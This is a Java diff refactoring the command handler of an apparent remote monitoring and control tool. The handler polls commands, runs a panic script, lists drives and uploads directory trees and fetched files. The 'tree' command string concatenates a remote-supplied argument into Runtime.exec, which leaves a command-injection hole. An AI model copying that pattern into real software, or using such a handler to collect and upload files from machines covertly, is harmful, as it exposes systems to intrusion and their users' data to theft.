@@ -59,7 +59,7 @@ import lombok.extern.slf4j.Slf4j;
  * <code>config VideoDuration 600000</code> : Set screen recording duration to 10 mins
  */
 @Slf4j
-public class CommandHandler implements Runnable {
+public class CommandHandler {
 
   /**
    * Reference to the thread created by this instance
@@ -67,8 +67,15 @@ public class CommandHandler implements Runnable {
   public Thread thread;
 
   public CommandHandler() {
-    thread = new Thread(this, "Command");
-    thread.start();
+    this.createThread();
+  }
+
+  public void createThread() {
+    thread = new Thread(this::run, "Command");
+  }
+
+  public void start() {
+    this.thread.start();
   }
 
   /**
@@ -76,9 +83,9 @@ public class CommandHandler implements Runnable {
    *
    * @throws IOException when the command cannot be executed or the command fails.
    */
-  public void executeCommand() throws IOException {
+  public void execute() throws IOException {
     try {
-      String[] commandStore = Service.getCommands();
+      String[] commandStore = RMAC.service.getCommands();
       if (Objects.isNull(commandStore) || commandStore.length == 0) {
         return;
       }
@@ -95,8 +102,11 @@ public class CommandHandler implements Runnable {
           case "panic": {
             log.info("Command Received: 'panic'");
             Runtime.getRuntime().exec("\"" + Constants.SCRIPTS_LOCATION + "\\SysAdmin.vbs\"");
-            Thread.sleep(100);
+            synchronized (this.thread) {
+              this.thread.wait(100);
+            }
             System.exit(0);
+            break;
           }
           case "drive": {
             String[] parts = currCommand.split(" ");
@@ -106,11 +116,11 @@ public class CommandHandler implements Runnable {
             }
             String subCommand = parts[1].trim().toLowerCase();
             if (subCommand.equals("list")) {
-              File[] roots = File.listRoots();
+              String[] roots = RMAC.fs.getRoots();
               String fileName =
                   Constants.RUNTIME_LOCATION + "\\DriveDetails-" + Utils.getTimestamp() + ".txt";
-              PrintStream fileRoots = new PrintStream(fileName);
-              for (File root : roots) {
+              PrintStream fileRoots = RMAC.fs.getPrintStream(fileName);
+              for (String root : roots) {
                 fileRoots.println(root);
               }
               fileRoots.close();
@@ -126,17 +136,13 @@ public class CommandHandler implements Runnable {
               Process proc = Runtime.getRuntime()
                   .exec("tree " + arg1 + ":\\ /f /a > \"" + fileName + "\"");
               proc.waitFor();
-              if (new File(arg1 + ":\\").exists()) {
-                RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
-              } else {
-                log.warn("Directory " + arg1 + ":\\ Doesn't Exist");
-              }
+              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
             }
             break;
           }
           case "fetch": {
             String filePath = currCommand.substring(currCommand.indexOf(' ') + 1);
-            if ("".equals(filePath)) {
+            if ("".equals(filePath) || !currCommand.contains(" ")) {
               log.warn("Invalid command '" + currCommand + "'");
               continue;
             }
@@ -212,25 +218,25 @@ public class CommandHandler implements Runnable {
             log.warn("Command not found: '" + currCommand + "'");
           }
         }
-        Thread.sleep(100);
       }
     } catch (InterruptedException e) {
       log.error("Could not execute commands", e);
     }
   }
 
-  @Override
   public void run() {
     try {
       while (!Thread.interrupted()) {
         try {
-          executeCommand();
+          this.execute();
         } catch (IOException e) {
           log.error("Could not execute command", e);
         }
-        Thread.sleep(RMAC.config.getFetchCommandPollInterval());
+        synchronized (this.thread) {
+          this.thread.wait(RMAC.config.getFetchCommandPollInterval());
+        }
       }
-    } catch (InterruptedException e) {
+    } catch (InterruptedException | IllegalArgumentException e) {
       log.warn("Stopped", e);
     }
   }
